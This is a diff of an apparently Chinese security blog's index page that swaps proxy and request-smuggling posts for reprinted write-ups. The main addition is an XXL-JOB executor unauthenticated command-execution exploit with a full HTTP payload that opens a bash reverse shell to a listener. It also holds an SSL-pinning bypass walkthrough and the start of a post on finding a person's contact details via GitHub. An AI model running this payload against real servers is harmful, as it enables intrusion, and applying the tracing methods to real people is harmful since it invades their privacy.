@@ -86,56 +86,46 @@
 
     
         <h2 class="title">
-            <a href="/2023/07/04/Curl-Socks5h-x/">
-                Curl-Socks5h-x
+            <a href="/2023/09/03/XXL-JOB-Executor/">
+                XXL-JOB executor未授权访问漏洞
             </a>
         </h2>
     
     <time>
-        Jul 4, 2023
+        Sep 3, 2023
     </time>
     <section class="content">
-        <h1><span id="linux讓-curl-藉由-socks5-proxy-連線時不要反解-dns造成連線失敗">[Linux]讓 curl 藉由 socks5 proxy 連線時，不要反解 DNS，造成連線失敗</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://ephrain.net/linux-%e8%ae%93-curl-%e8%97%89%e7%94%b1-socks5-proxy-%e9%80%a3%e7%b7%9a%e6%99%82%ef%bc%8c%e4%b8%8d%e8%a6%81%e5%8f%8d%e8%a7%a3-dns%ef%bc%8c%e9%80%a0%e6%88%90%e9%80%a3%e7%b7%9a%e5%a4%b1%e6%95%97/">Ephrain</a> 并作补充</p>
+        <h1><span id="xxl-job-executor未授权访问漏洞">XXL-JOB executor未授权访问漏洞</span></h1><h2><span id="漏洞详情">漏洞详情</span></h2><blockquote>
+<p>XXL-JOB是一个轻量级分布式任务调度平台。默认情况下XXL-JOB的Restful API接口或RPC接口没有配置认证措施，未授权的攻击者可构造恶意请求，造成远程执行命令，直接控制服务器。</p>
 </blockquote>
-<h2><span id="proxy-server链接问题">Proxy Server链接问题</span></h2><blockquote>
-<p>公司的專案程式通常需要支援各種 proxy server，如 HTTP proxy, socks4 和 socks5 proxy。<br>今天遇到一個問題，我們的程式底層會使用 libcurl 做 HTTP 連線，但連到一台 socks5 proxy 時卻不能成功…</p>
-<p>試著用 curl 加上 -x 選項來指定 proxy server，再加 -v 選項看看詳細的錯誤訊息：</p>
+<h2><span id="漏洞影响">漏洞影响</span></h2><blockquote>
+<p>XXL-JOB &lt;&#x3D; 2.2.0</p>
 </blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">testuser@localhost ~ curl -v -x socks5://172.22.1.1:8080 https://testdomain.com</span><br><span class="line"></span><br><span class="line">* Rebuilt URL to: https://testdomain.com/</span><br><span class="line">*   Trying 172.22.1.1...</span><br><span class="line">* TCP_NODELAY <span class="built_in">set</span></span><br><span class="line">* SOCKS5 communication to testdomain.com:443</span><br><span class="line">* SOCKS5 connect to IPv6 2600:1417:1b:184::23ac (locally resolved)</span><br><span class="line">* Can<span class="string">&#x27;t complete SOCKS5 connection to 0.0.0.0:0. (1)</span></span><br><span class="line"><span class="string">* Closing connection 0</span></span><br><span class="line"><span class="string">curl: (7) Can&#x27;</span>t complete SOCKS5 connection to 0.0.0.0:0. (1)</span><br></pre></td></tr></table></figure>
+<h2><span id="漏洞分析">漏洞分析</span></h2><blockquote>
+<p>XXL-JOB的Restful API分为两种，一个 调度中心Restful API，一个 执行器Restful API。其中在执行器Restful API的任务触发声明中，发送请求的数据格式为：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">地址格式：</span><br><span class="line">    &#123;执行器内嵌服务跟地址&#125;/run 	<span class="comment">//也就是说为executor端的地址，ip:9999/run</span></span><br><span class="line"> </span><br><span class="line">Header： </span><br><span class="line">    XXL-JOB-ACCESS-TOKEN : &#123;请求令牌&#125; 	</span><br><span class="line"> </span><br><span class="line">请求数据格式如下，放置在 RequestBody 中，JSON格式： </span><br><span class="line">&#123; </span><br><span class="line">    <span class="string">&quot;jobId&quot;</span>:<span class="number">1</span>, <span class="comment">// 任务ID </span></span><br><span class="line">    <span class="string">&quot;executorHandler&quot;</span>:<span class="string">&quot;demoJobHandler&quot;</span>, <span class="comment">// 任务标识 </span></span><br><span class="line">    <span class="string">&quot;executorParams&quot;</span>:<span class="string">&quot;demoJobHandler&quot;</span>, <span class="comment">// 任务参数 </span></span><br><span class="line">    <span class="string">&quot;executorBlockStrategy&quot;</span>:<span class="string">&quot;COVER_EARLY&quot;</span>, <span class="comment">// 任务阻塞策略，可选值参考   com.xxl.job.core.enums.ExecutorBlockStrategyEnum </span></span><br><span class="line">    <span class="string">&quot;executorTimeout&quot;</span>:<span class="number">0</span>, <span class="comment">// 任务超时时间，单位秒，大于零时生效 </span></span><br><span class="line">    <span class="string">&quot;logId&quot;</span>:<span class="number">1</span>, <span class="comment">// 本次调度日志ID </span></span><br><span class="line">    <span class="string">&quot;logDateTime&quot;</span>:<span class="number">1586629003729</span>, <span class="comment">// 本次调度日志时间 </span></span><br><span class="line">    <span class="string">&quot;glueType&quot;</span>:<span class="string">&quot;BEAN&quot;</span>, <span class="comment">// 任务模式，可选值参考 com.xxl.job.core.glue.GlueTypeEnum 		&quot;glueSource&quot;:&quot;xxx&quot;, // GLUE脚本代码 </span></span><br><span class="line">    <span class="string">&quot;glueUpdatetime&quot;</span>:<span class="number">1586629003727</span>, <span class="comment">// GLUE脚本更新时间，用于判定脚本是否变更以及是否需要刷新 </span></span><br><span class="line">    <span class="string">&quot;broadcastIndex&quot;</span>:<span class="number">0</span>, <span class="comment">// 分片参数：当前分片 </span></span><br><span class="line">    <span class="string">&quot;broadcastTotal&quot;</span>:<span class="number">0</span> <span class="comment">// 分片参数：总分片 </span></span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">响应数据格式： </span><br><span class="line">    &#123; <span class="string">&quot;code&quot;</span>: <span class="number">200</span>, <span class="comment">// 200 表示正常、其他失败 &quot;msg&quot;: null // 错误提示消息 &#125;</span></span><br></pre></td></tr></table></figure>
+
 <blockquote>
-<p>可以看到訊息裡有一行 locally resolved，這行代表的是 curl 自行去查詢了 DNS，將 testdomain.com 的 IP 找出來，但因為 curl 使用的是 Happy Eyeball 的演算法，同時會發出 Type A 和 AAAA 的 DNS request 封包，因此如果 AAAA 的 DNS 回應封包先回來的話，就會拿到 testdomain.com 的對應 IPv6 位址，反之如果是 A 的 DNS 回應封包先回來的話，拿到的則是 IPv4 位址。</p>
+<p>其中”glueType”:”BEAN” 任务模式的选值如下</p>
 </blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BEAN(<span class="string">&quot;BEAN&quot;</span>, <span class="literal">false</span>, <span class="literal">null</span>, <span class="literal">null</span>),</span><br><span class="line">GLUE_GROOVY(<span class="string">&quot;GLUE(Java)&quot;</span>, <span class="literal">false</span>, <span class="literal">null</span>, <span class="literal">null</span>),</span><br><span class="line">GLUE_SHELL(<span class="string">&quot;GLUE(Shell)&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;.sh&quot;</span>), </span><br><span class="line">GLUE_PYTHON(<span class="string">&quot;GLUE(Python)&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;python&quot;</span>, <span class="string">&quot;.py&quot;</span>), </span><br><span class="line">GLUE_PHP(<span class="string">&quot;GLUE(PHP)&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;php&quot;</span>, <span class="string">&quot;.php&quot;</span>), </span><br><span class="line">GLUE_NODEJS(<span class="string">&quot;GLUE(Nodejs)&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;node&quot;</span>, <span class="string">&quot;.js&quot;</span>), </span><br><span class="line">GLUE_POWERSHELL(<span class="string">&quot;GLUE(PowerShell)&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;powershell&quot;</span>, <span class="string">&quot;.ps1&quot;</span>);</span><br></pre></td></tr></table></figure>
+
 <blockquote>
-<p>下面用 Wireshark 觀察一下 curl 產生出來的 DNS 封包，它送出了 A 和 AAAA 兩種 DNS 封包，以下例來說是 A (IPv4) 的回應先回來，但這個結果會依據網路狀況而有所不同，有時候是 AAAA (IPv6) 的回應先回來：<br><img src="/2023/07/04/Curl-Socks5h-x/1.png" alt="image"></p>
+<p>也就是说我们可以从中任意选择一种脚本语言，然后在”glueSource”:”xxx”中插入相对应的脚本代码即可执行相对应的命令。</p>
+<p>比如对方如果是linux系统的服务器，那么就可以构造反弹shell命令执行代码为：</p>
 </blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;glueType&quot;</span>:<span class="string">&quot;GLUE_SHELLl&quot;</span>，</span><br><span class="line"><span class="string">&quot;glueSource&quot;</span>:<span class="string">&quot;/bin/bash / -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2><span id="漏洞利用">漏洞利用</span></h2><blockquote>
+<p>访问XXL-JOB存在漏洞版本的客户端（executor），利用burpsuite发送如下payload：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST /run HTTP/<span class="number">1.1</span></span><br><span class="line">Host: ip:<span class="number">9999</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/json</span></span><br><span class="line"><span class="comment">Content-Length: 394</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  &quot;jobId&quot;: 1,</span></span><br><span class="line"><span class="comment">  &quot;executorHandler&quot;: &quot;demoJobHandler&quot;,</span></span><br><span class="line"><span class="comment">  &quot;executorParams&quot;: &quot;demoJobHandler&quot;,</span></span><br><span class="line"><span class="comment">  &quot;executorBlockStrategy&quot;: &quot;COVER_EARLY&quot;,</span></span><br><span class="line"><span class="comment">  &quot;executorTimeout&quot;: 0,</span></span><br><span class="line"><span class="comment">  &quot;logId&quot;: 1,</span></span><br><span class="line"><span class="comment">  &quot;logDateTime&quot;: 1586629003729,</span></span><br><span class="line"><span class="comment">  &quot;glueType&quot;: &quot;GLUE_SHELL&quot;,</span></span><br><span class="line"><span class="comment">  &quot;glueSource&quot;: &quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.30.1/5555 0&gt;&amp;1&quot;,</span></span><br><span class="line"><span class="comment">  &quot;glueUpdatetime&quot;: 1586699003758,</span></span><br><span class="line"><span class="comment">  &quot;broadcastIndex&quot;: 0,</span></span><br><span class="line"><span class="comment">  &quot;broadcastTotal&quot;: 0</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>
+
 <blockquote>
-<p>curl 自行查詢 DNS 這件事情有什麼錯誤嗎？<br>以這個例子來說，curl 幫忙查出 testdomain.com 的 IPv6 位址 2600:1417:1b:184::23ac，然後連線到 socks5 proxy 172.22.1.1，叫它連線到這個 IPv6 位址去。<br>然而，這台 socks5 proxy 所在的網路只設定了 IPv4 位址，所以 proxy server 本身是無法藉由 IPv6 位址來連線的！<br>因此它自然無法連線到 curl 指定的 IPv6 位址，導致連線失敗…</p>
-</blockquote>
-<blockquote>
-<p>要解決這個問題，可以叫 curl 不要雞婆自己去查 DNS，而是讓 proxy server 自己來查 DNS，因為 proxy server 自己知道所處的網路環境，像是它不能連 IPv6 網路時，自然不會去問 Type AAAA (IPv6) 的 DNS 結果。</p>
-</blockquote>
-<blockquote>
-<p>我們將原本的 socks5:&#x2F;&#x2F;<proxy>:<port> 改成 socks5h:&#x2F;&#x2F;<proxy>:<port>，代表要讓 proxy 自己的查詢 DNS，可以看到 curl 直接連到了 proxy server，沒有先做 DNS 查詢，而最終 proxy 也成功完成了連線：</port></proxy></port></proxy></p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">testuser@localhost ~ curl -v -x socks5h://172.22.1.1:8080 https://testdomain.com</span><br><span class="line"></span><br><span class="line">* Rebuilt URL to: https://testdomain.com/</span><br><span class="line">*   Trying 172.22.1.1...</span><br><span class="line">* TCP_NODELAY <span class="built_in">set</span></span><br><span class="line">* SOCKS5 communication to testdomain.com:443</span><br><span class="line">* SOCKS5 request granted.</span><br><span class="line">* Connected to 172.22.1.1 (172.22.1.1) port 8080 (<span class="comment">#0)</span></span><br><span class="line">...</span><br><span class="line">* Curl_http_done: called premature == 0</span><br><span class="line">* Connection <span class="comment">#0 to host testdomain.com left intact</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>不過這種雷，幾乎是每次整合一個用到 libcurl 的模組，就會再踩到一次啊…</p>
-</blockquote>
-<h2><span id="我遇到的场景">我遇到的场景</span></h2><blockquote>
-<p>首先，我没想到我会被台湾同胞的这篇技术博客教到很有趣的东西，其次，博主的语言和繁体配合起来更有趣了，也基于尊重保留了完整原文<br><img src="/2023/07/04/Curl-Socks5h-x/1.jpg" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>公司做安全监控平台收敛内网后，外部主机关联内网服务器的数据，需要监控进程 agent 以走代理的方式进来<br>自然代理服务器的公网地址和内网地址不在一个网段，然后为了安全性，代理服务器内网地址虽然和监控服务器同一网段，但由于安全组的隔离两者是不能直接访问的……(<em>´◐∀◐&#96;</em>)</p>
-</blockquote>
-<blockquote>
-<p>代中代(<em>´◐∀◐&#96;</em>)</p>
-</blockquote>
-<blockquote>
-<p>很自然的 curl 即使走代理都找不到身处内网的监控服务器域名<br>我只能在代理服务器 host 上配一下域名解析，然后翻了许久找到了 curl 的代理访问方式原理，就是这位博主的文章，让我明白了可以让 Proxy Server 去做 curl 的进一步内网解析<br>泪目，乙方厂商技术整半天都解决不了的问题，后来和我说我给的命令，其他客户也有这种问题的不能装的也能装了，让我找他们销售要钱草w(“▔□▔)</p>
-</blockquote>
-<blockquote>
-<p>希望两岸互相少点偏见吧</p>
+<p><img src="/2023/09/03/XXL-JOB-Executor/1.png" alt="image"></p>
+<p>开启监听后，即可反弹回shell</p>
+<p><img src="/2023/09/03/XXL-JOB-Executor/2.png" alt="image"></p>
 </blockquote>
 
 
@@ -143,7 +133,7 @@
 
         
             <div class="tags">
-                <a class="tag-none-link" href="/tags/Chaos/" rel="tag">Chaos</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Socks5/" rel="tag">Socks5</a>
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/XXL-JOB/" rel="tag">XXL-JOB</a>
             </div>
         
 
@@ -154,110 +144,41 @@
 
     
         <h2 class="title">
-            <a href="/2023/06/27/Danted-Socks5-proxy/">
-                Danted Socks5代理搭建
+            <a href="/2023/09/03/Xposed-HTTPS/">
+                夜神模拟器+Xposed框架+JustTrustMe（用来禁用、绕过 SSL 证书检查）来突破SSL Pinning
             </a>
         </h2>
     
     <time>
-        Jun 27, 2023
+        Sep 3, 2023
     </time>
     <section class="content">
-        <h1><span id="danted-socks5代理搭建">Danted Socks5代理搭建</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://sunpma.com/724.html">SunPma</a> 并作补充</p>
+        <h1><span id="夜神模拟器xposed框架justtrustme用来禁用-绕过-ssl-证书检查来突破ssl-pinning">夜神模拟器+Xposed框架+JustTrustMe（用来禁用、绕过 SSL 证书检查）来突破SSL Pinning</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/kai402458953/article/details/99483077">sort浅忆</a> 并作补充</p>
 </blockquote>
-<h2><span id="说明">说明</span></h2><blockquote>
-<p>Socks5属于明文代理，不要用于科学上网，否则会被阻断端口，可用于正常的跳板使用；<br>比如SSH转发加速国外VPS的连接速度，特别是一些延迟高或者丢包高的VPS；<br>使用Socks5转发后SSH就可以快速稳定的连接了，解决高丢包SSH断开的问题；</p>
-</blockquote>
-<h2><span id="支持">支持</span></h2><blockquote>
-<p>支持系统：Debian7+ Ubuntu14.04+ CentOS6+</p>
-</blockquote>
-<h2><span id="安装">安装</span></h2><blockquote>
-<p>下载脚本：</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --no-check-certificate https://raw.github.com/Lozy/danted/master/install.sh -O install.sh</span><br></pre></td></tr></table></figure>
-
 <blockquote>
-<p>安装脚本：</p>
+<p>1.夜神模拟器官网下载安装 模拟器</p>
+<p>2.创建一个安卓5.1版本的模拟器</p>
+<p><img src="/2023/09/03/Xposed-HTTPS/1.png" alt="image"></p>
+<p>3.把xposed.apk  拖入夜神模拟器 （ Android 5.1.版本，xposed3.1.5 版本） </p>
+<p><img src="/2023/09/03/Xposed-HTTPS/2.png" alt="image"></p>
+<p>4.安装xposed框架</p>
+<p><img src="/2023/09/03/Xposed-HTTPS/3.png" alt="image"></p>
+<p><img src="/2023/09/03/Xposed-HTTPS/4.png" alt="image"></p>
+<p><img src="/2023/09/03/Xposed-HTTPS/5.png" alt="image"></p>
+<p>下载安装完成后， 重启系统</p>
+<p>5.安装JustTrustMe.apk   </p>
+<p>点击“模块”，此时还没有可用的模块，同样的方法点击apk+导入之前下载好的JustTrustMe的apk安装包，系统会自动安装，安装完成后，在模块里面点击“软重启”，再次打开“模块”界面，即可看到JustTrustMe，勾选一下，启用这个模块：</p>
+<p><img src="/2023/09/03/Xposed-HTTPS/6.png" alt="image"></p>
+<p>6.重启生效， 接下载安装 fiddler证书， 设置WLAN代理</p>
 </blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash install.sh  --port=端口 --user=用户名 --passwd=密码</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>其中的端口 用户名 密码自行修改后粘贴到SSH里运行安装即可；<br>完成后会提示Dante Server Install Successfuly即表示安装成功；<br>安装后如果连接不上，检查设置的端口是否已经放行；<br>说明：安装完成后会显示内网IP地址，但在实际使用的时候需要用外网IP地址；</p>
-</blockquote>
-<h2><span id="使用">使用</span></h2><blockquote>
-<p>一般使用IP和用户名密码即可使用<br>如果需要固定IP或IP段，可以修改配置文件设置白名单</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/danted/sockd.conf</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>修改以下代码，改成你需要设置的白名单IP或IP段即可，然后重启使其生效；</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">client pass &#123;</span><br><span class="line">        from: 0.0.0.0/0  to: 0.0.0.0/0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2><span id="卸载">卸载</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash install.sh --uninstall</span><br></pre></td></tr></table></figure>
-
-<h2><span id="命令">命令</span></h2><table>
-<thead>
-<tr>
-<th align="left">命令</th>
-<th align="left">或者</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">service sockd start</td>
-<td align="left">&#x2F;etc&#x2F;init.d&#x2F;sockd start</td>
-<td align="left">启动socks5服务器守护进程</td>
-</tr>
-<tr>
-<td align="left">service sockd stop</td>
-<td align="left">&#x2F;etc&#x2F;init.d&#x2F;sockd stop</td>
-<td align="left">停止socks5服务器守护进程</td>
-</tr>
-<tr>
-<td align="left">service sockd restart</td>
-<td align="left">&#x2F;etc&#x2F;init.d&#x2F;sockd restart</td>
-<td align="left">重新启动socks5服务器守护进程</td>
-</tr>
-<tr>
-<td align="left">service sockd reload</td>
-<td align="left">&#x2F;etc&#x2F;init.d&#x2F;sockd reload</td>
-<td align="left">重新加载socks5服务器守护进程</td>
-</tr>
-<tr>
-<td align="left">service sockd status</td>
-<td align="left">&#x2F;</td>
-<td align="left">系统进程状态</td>
-</tr>
-<tr>
-<td align="left">service sockd state</td>
-<td align="left">&#x2F;etc&#x2F;init.d&#x2F;sockd state</td>
-<td align="left">运行状态</td>
-</tr>
-<tr>
-<td align="left">service sockd tail</td>
-<td align="left">&#x2F;etc&#x2F;init.d&#x2F;sockd tail</td>
-<td align="left">sock 日志</td>
-</tr>
-<tr>
-<td align="left">service sockd adduser</td>
-<td align="left">&#x2F;etc&#x2F;init.d&#x2F;sockd adduser</td>
-<td align="left">添加pam-auth用户：service sockd adduser NAME PASSWORD</td>
-</tr>
-<tr>
-<td align="left">service sockd deluser</td>
-<td align="left">&#x2F;etc&#x2F;init.d&#x2F;sockd deluser</td>
-<td align="left">删除pam-auth用户：service sockd deluser NAME</td>
-</tr>
-</tbody></table>
 
 
         
 
         
             <div class="tags">
-                <a class="tag-none-link" href="/tags/Danted/" rel="tag">Danted</a><a class="tag-none-link" href="/tags/Proxy/" rel="tag">Proxy</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Socks5/" rel="tag">Socks5</a>
+                <a class="tag-none-link" href="/tags/HTTPS/" rel="tag">HTTPS</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/SSL/" rel="tag">SSL</a><a class="tag-none-link" href="/tags/Xposed/" rel="tag">Xposed</a>
             </div>
         
 
@@ -268,111 +189,48 @@
 
     
         <h2 class="title">
-            <a href="/2023/06/27/HTTP-request-smuggling-vulnerability/">
-                HTTP请求走私漏洞
+            <a href="/2023/09/03/Github-Find-Email/">
+                如何通过 Github 找到一个人？
             </a>
         </h2>
     
     <time>
-        Jun 27, 2023
+        Sep 3, 2023
     </time>
     <section class="content">
-        <h1><span id="http请求走私漏洞">HTTP请求走私漏洞</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46150940/article/details/115311234">Atkxor</a> 并作补充</p>
-</blockquote>
-<h2><span id="简介">简介</span></h2><blockquote>
-<p>HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求序列的方式的技术。请求走私漏洞本质上通常很关键，它使攻击者可以绕过安全控制，未经授权访问敏感数据并直接危害其他应用程序用户。</p>
-<ul>
-<li>利用Content-Length字段来判定请求体的内容长度</li>
-<li>利用Transfer-Encoding字段来判定请求体的结束位置</li>
-</ul>
-</blockquote>
-<h2><span id="基础知识">基础知识</span></h2><h3><span id="content-length">Content-Length</span></h3><blockquote>
-<p>Content-Length即为实体长度。浏览器可以通过 Content-Length 的长度信息，判断出响应实体已结束。通常如果 Content-Length 比实际长度短，会造成内容被截断；如果比实体内容长，会造成 pending。</p>
-</blockquote>
-<h3><span id="transfer-encoding">Transfer-Encoding</span></h3><blockquote>
-<p>历史上 Transfer-Encoding 可以有多种取值，但最新的 HTTP 规范里，只定义了一种传输编码：分块编码（chunked）。<br>分块编码相当简单，在头部加入 Transfer-Encoding: chunked 之后，就代表这个报文采用了分块编码。这时，报文中的实体需要改为用一系列分块来传输。每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的 CRLF（\r\n），也不包括分块数据结尾的 CRLF。最后一个分块长度值必须为 0，对应的分块数据没有内容，表示实体结束。</p>
-</blockquote>
-<h3><span id="cl与te解析优先级顺序">CL与TE解析优先级顺序</span></h3><blockquote>
-<p>CL表示Content-Length，TE表示Transfer-Encoding。优先级顺序详见 <a target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/html/rfc7230#section-3.3.3">RFC7230 section 3.3.3</a></p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">If a message is received with both a Transfer-Encoding and a</span><br><span class="line">Content-Length header field, the Transfer-Encoding overrides the</span><br><span class="line">Content-Length. Such a message might indicate an attempt to perform</span><br><span class="line">request smuggling (Section 9.5) or response splitting (Section 9.4)</span><br><span class="line">and ought to be handled as an error. A sender MUST remove the received Content-Length field prior to forwarding such a message downstream.</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>TE 优先于 CL ，但可以通过一些方式绕过</p>
-</blockquote>
-<h2><span id="请求走私分类">请求走私分类</span></h2><blockquote>
-<p>请求走私攻击包括将Content-Length标头和Transfer-Encoding 标头都放入单个HTTP请求中并进行处理，以便前端服务器和后端服务器以不同的方式处理请求。完成此操作的确切方式取决于两个服务器的行为：</p>
-<ul>
-<li>CL不为0:前端代理服务器允许请求携带请求体，而后端服务器不允许请求携带请求体。</li>
-<li>CL-CL：前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。</li>
-<li>CL-TE：前端服务器使用Content-Length标头，而后端服务器使用Transfer- Encoding标头。</li>
-<li>TE-TE：前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过某种方式混淆标头来诱导其中一台服务器不对其进行处理。</li>
-<li>TE-CL：前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。</li>
-</ul>
-</blockquote>
-<h3><span id="cl不为0">CL不为0</span></h3><blockquote>
-<p>所有不携带请求体的HTTP请求都有可能受此影响,这里以GET请求为例。<br>当前端服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的Content-Length头，不进行处理。这就有可能导致请求走私。<br>比如构造请求：</p>
-</blockquote>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>demo.com\r\n</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>44\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET /secret HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>demo.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>注：\r\n表示 CRLF即换行</p>
+        <h1><span id="如何通过-github-找到一个人">如何通过 Github 找到一个人？</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.ixiqin.com/2020/01/08/how-to-find-a-person-through-making/#:~:text=%E6%83%B3%E8%A6%81%E9%80%9A%E8%BF%87%20Git%20%E6%89%BE%E5%88%B0%E4%B8%80%E4%B8%AA%E4%BA%BA%E7%9A%84%E9%82%AE%E7%AE%B1%EF%BC%8C%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E6%96%B9%E6%B3%95%E5%B0%B1%E6%98%AF%E4%BD%BF%E7%94%A8%20Github%20%E6%8F%90%E4%BE%9B%E7%9A%84%20GraphQL%20%E6%9D%A5%E8%BF%9B%E8%A1%8C%E6%9F%A5%E8%AF%A2%EF%BC%8C%E7%AE%80%E5%8D%95%E6%96%B9%E4%BE%BF%E3%80%82%20%E8%AE%BF%E9%97%AE,in%20%EF%BC%8C%E4%BD%BF%E7%94%A8%E4%BD%A0%E7%9A%84%20Github%20%E8%B4%A6%E5%8F%B7%E7%99%BB%E9%99%86%EF%BC%8C%E8%BF%99%E6%A0%B7%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%B0%83%E7%94%A8%20Github%20%E7%9A%84%20API%20%E4%BA%86%E3%80%82">白宦成</a> 并作补充</p>
 </blockquote>
 <blockquote>
-<p>前端服务器处理了Content-Length，而后端服务器没有处理 Content-Length ，基于pipeline机制认为这是两个独立的请求：<br>第一个请求：</p>
+<p>很多时候，我们都需要找到一个人的联系方式。但是，并不是每一次我们都可以很好的拿到他的联系方式，这个时候，我们就需要借助一些奇技淫巧来找到一个人的联系方式。</p>
 </blockquote>
